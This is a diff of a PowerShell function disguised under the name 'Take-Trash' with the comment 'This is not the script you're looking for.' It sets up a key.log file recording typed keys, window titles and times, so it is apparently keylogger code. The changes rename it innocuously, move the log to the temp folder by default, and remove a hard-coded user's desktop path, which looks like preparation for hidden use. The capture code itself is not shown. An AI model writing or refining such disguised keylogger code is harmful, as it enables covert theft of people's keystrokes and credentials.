@@ -1,7 +1,10 @@
-function takeoutthetrash {
+function Take-Trash {
 #This is not the script you're looking for.
     [CmdletBinding()] 
     Param (
+        [Parameter(Position = 0)]
+        [ValidateScript({Test-Path (Resolve-Path (Split-Path -Parent -Path $_)) -PathType Container})]
+        [String]$LogPath = "$($env:TEMP)\key.log",
 
         [Parameter(Position = 1)]
         [Double]$Timeout,
@@ -10,7 +13,7 @@ function takeoutthetrash {
         [Switch]$PassThru
     )
 
-    $LogPath = "C:/Users/Luis Morales/Desktop/key.log"
+    $LogPath = Join-Path (Resolve-Path (Split-Path -Parent $LogPath)) (Split-Path -Leaf $LogPath)
 
     try { '"TypedKey","WindowTitle","Time"' | Out-File -FilePath $LogPath -Encoding unicode }
     catch { throw $_ }
